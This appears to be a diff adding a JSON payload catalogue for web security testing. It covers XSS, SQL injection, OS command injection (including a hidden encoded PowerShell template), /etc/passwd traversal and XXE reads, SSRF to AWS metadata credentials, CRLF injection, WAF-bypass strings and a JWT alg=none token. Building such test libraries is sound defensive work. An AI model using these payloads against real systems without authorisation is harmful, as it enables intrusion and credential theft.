@@ -1,0 +1,291 @@
+{
+  "XSS": {
+    "description": "Cross-Site Scripting payload families (Reflected, Stored, DOM, Blind)",
+    "payloads": [
+      {
+        "id": "xss.reflected.simple_script",
+        "category": "XSS",
+        "subcategory": "Reflected",
+        "description": "Simple reflected XSS in body context",
+        "tags": ["html","js","reflected","simple"],
+        "content": {
+          "html": "<script>alert(\"XSS:{param}\")</script>",
+          "raw": "<script>alert(\"XSS:{param}\")</script>",
+          "urlencoded": "<script>alert(\"XSS:{param}\")</script>"
+        }
+      },
+      {
+        "id": "xss.attr.img.onerror",
+        "category": "XSS",
+        "subcategory": "Attributes",
+        "description": "XSS via img onerror attribute",
+        "tags": ["attr","onerror","img","waf-bypass"],
+        "content": {
+          "html": "<img src=\"x\" onerror=\"alert('XSS:{param}')\">",
+          "svg": "<svg><image href=\"x\" onerror=\"alert('XSS:{param}')\"/></svg>",
+          "raw": "<img src=\\\"x\\\" onerror=\\\"alert('XSS:{param}')\\\">"
+        }
+      },
+      {
+        "id": "xss.json.key",
+        "category": "XSS",
+        "subcategory": "JSON",
+        "description": "XSS payload injected into JSON value",
+        "tags": ["json","dom","reflected"],
+        "content": {
+          "json": "{\"name\":\"{param}\"}",
+          "js": "var data = JSON.parse('{json}');"
+        }
+      }
+    ]
+  },
+  "SQLi": {
+    "description": "SQL Injection payloads for various DBMS and techniques",
+    "payloads": [
+      {
+        "id": "sqli.boolean.true",
+        "category": "SQLi",
+        "subcategory": "Boolean-based",
+        "description": "Simple boolean-based payload",
+        "tags": ["mysql","pgsql","boolean","basic"],
+        "content": {
+          "raw": "' OR 1=1 -- ",
+          "urlencoded": "'%20OR%201=1%20--%20"
+        }
+      },
+      {
+        "id": "sqli.time.sleep.mysql",
+        "category": "SQLi",
+        "subcategory": "Time-based",
+        "description": "MySQL time-based blind payload",
+        "tags": ["mysql","time-based","blind"],
+        "content": {
+          "raw": "' OR SLEEP(5) -- ",
+          "urlencoded": "'%20OR%20SLEEP(5)%20--%20"
+        }
+      }
+    ]
+  },
+  "CommandInjection": {
+    "description": "OS command injection payloads for Bash, Powershell, CMD",
+    "payloads": [
+      {
+        "id": "cmdinjection.semicolon",
+        "category": "CommandInjection",
+        "subcategory": "Linux:Bash",
+        "description": "Append command using semicolon",
+        "tags": ["bash","separator","simple"],
+        "content": {
+          "raw": "; ls -la /tmp;",
+          "urlencoded": "%3B%20ls%20-la%20%2Ftmp%3B"
+        }
+      },
+      {
+        "id": "cmdinjection.powershell",
+        "category": "CommandInjection",
+        "subcategory": "Windows:Powershell",
+        "description": "Powershell command injection via ; and encoded commands",
+        "tags": ["powershell","win"],
+        "content": {
+          "raw": "; powershell -NoP -NonI -W Hidden -Enc {b64cmd}",
+          "base64": "{b64cmd}"
+        }
+      }
+    ]
+  },
+  "LFI": {
+    "description": "Local File Inclusion and Path Traversal payloads",
+    "payloads": [
+      {
+        "id": "lfi.simple.traversal",
+        "category": "LFI",
+        "subcategory": "Traversal",
+        "description": "Classic directory traversal",
+        "tags": ["lfi","traversal"],
+        "content": {
+          "raw": "../../../../etc/passwd",
+          "encoded": "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+        }
+      },
+      {
+        "id": "lfi.php.filter",
+        "category": "LFI",
+        "subcategory": "Wrappers",
+        "description": "php://filter base64-encode tricks",
+        "tags": ["php","wrapper","bypass"],
+        "content": {
+          "raw": "php://filter/convert.base64-encode/resource=../../../../etc/passwd"
+        }
+      }
+    ]
+  },
+  "SSRF": {
+    "description": "Server-Side Request Forgery payloads",
+    "payloads": [
+      {
+        "id": "ssrf.aws.metadata",
+        "category": "SSRF",
+        "subcategory": "Cloud Metadata",
+        "description": "Indicative path for AWS metadata access",
+        "tags": ["aws","metadata","ssrf"],
+        "content": {
+          "raw": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "urlencoded": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        }
+      }
+    ]
+  },
+  "Deserialization": {
+    "description": "Insecure deserialization payloads and patterns",
+    "payloads": [
+      {
+        "id": "deser.python.pickle.reverse",
+        "category": "Deserialization",
+        "subcategory": "Python:Pickle",
+        "description": "Placeholder for Pickle gadget payload (NOT a runnable payload)",
+        "tags": ["pickle","deserialization"],
+        "content": {
+          "note": "For safety reasons, actual runnable gadget chains are omitted. Use generator to integrate safe test markers.",
+          "test": "MARKER_PICKLE:{param}"
+        }
+      }
+    ]
+  },
+  "XXE": {
+    "description": "XML External Entity payloads",
+    "payloads": [
+      {
+        "id": "xxe.basic.external",
+        "category": "XXE",
+        "subcategory": "In-Band",
+        "description": "Simple XXE to retrieve /etc/passwd (conceptual)",
+        "tags": ["xxe","dtd","external"],
+        "content": {
+          "xml": "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+          "raw": "<!DOCTYPE root [<!ENTITY % ext SYSTEM \"file:///etc/passwd\">]%ext;"
+        }
+      }
+    ]
+  },
+  "OpenRedirect": {
+    "description": "Open redirect payloads and obfuscated redirects",
+    "payloads": [
+      {
+        "id": "or.simple",
+        "category": "OpenRedirect",
+        "subcategory": "Simple",
+        "description": "Simple open redirect payload placeholder",
+        "tags": ["openredirect"],
+        "content": {
+          "raw": "{target_url}"
+        }
+      }
+    ]
+  },
+  "CRLF": {
+    "description": "CRLF and header injection payloads",
+    "payloads": [
+      {
+        "id": "crlf.setcookie",
+        "category": "CRLF",
+        "subcategory": "Set-Cookie",
+        "description": "CRLF injection to set a cookie",
+        "tags": ["crlf","header-injection","set-cookie"],
+        "content": {
+          "raw": "%0d%0aSet-Cookie:%20injected=1%3B%20HttpOnly"
+        }
+      }
+    ]
+  },
+  "BusinessLogic": {
+    "description": "Business logic abuse payloads and patterns",
+    "payloads": [
+      {
+        "id": "bla.price.manipulation",
+        "category": "BusinessLogic",
+        "subcategory": "Price",
+        "description": "Tamper parameter to attempt price manipulation",
+        "tags": ["logic","price"],
+        "content": {
+          "raw": "{param}=0.01"
+        }
+      }
+    ]
+  },
+  "GraphQL": {
+    "description": "GraphQL security payloads",
+    "payloads": [
+      {
+        "id": "graphql.introspection",
+        "category": "GraphQL",
+        "subcategory": "Introspection",
+        "description": "Introspection query payload",
+        "tags": ["graphql","introspection"],
+        "content": {
+          "raw": "{\"query\":\"{__schema{types{name}}}\"}"
+        }
+      }
+    ]
+  },
+  "API": {
+    "description": "API-focused payloads (IDOR, token attacks, JWT)",
+    "payloads": [
+      {
+        "id": "api.jwt.alg_none",
+        "category": "API",
+        "subcategory": "JWT",
+        "description": "JWT with alg=none test token",
+        "tags": ["jwt","token","auth"],
+        "content": {
+          "raw": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
+        }
+      }
+    ]
+  },
+  "Fuzzing": {
+    "description": "Fuzzing payloads for robustness testing",
+    "payloads": [
+      {
+        "id": "fuzz.longstring.10k",
+        "category": "Fuzzing",
+        "subcategory": "LongString",
+        "description": "Very long string placeholder",
+        "tags": ["fuzz","longstring"],
+        "content": {
+          "raw": "{param}PLACEHOLDER_LONG_10000"
+        }
+      }
+    ]
+  },
+  "WAF": {
+    "description": "WAF bypass techniques and payload variations",
+    "payloads": [
+      {
+        "id": "waf.obf.scrfragment",
+        "category": "WAF",
+        "subcategory": "Fragmentation",
+        "description": "Fragmented script tag to bypass naive filters",
+        "tags": ["waf","bypass","xss"],
+        "content": {
+          "html": "<scr<ipt>alert('XSS:{param}')</scr<ipt>",
+          "raw": "<scr<ipt>alert('XSS:{param}')</scr<ipt>"
+        }
+      }
+    ]
+  },
+  "Mobile": {
+    "description": "Mobile environment payloads and intent schemes",
+    "payloads": [
+      {
+        "id": "mobile.intent.gmail",
+        "category": "Mobile",
+        "subcategory": "Intent",
+        "description": "Example Android intent injection via URL scheme",
+        "tags": ["mobile","intent"],
+        "content": {
+          "raw": "intent://send/123#Intent;package=com.google.android.gm;end"
+        }
+      }
+    ]
+  }
+}
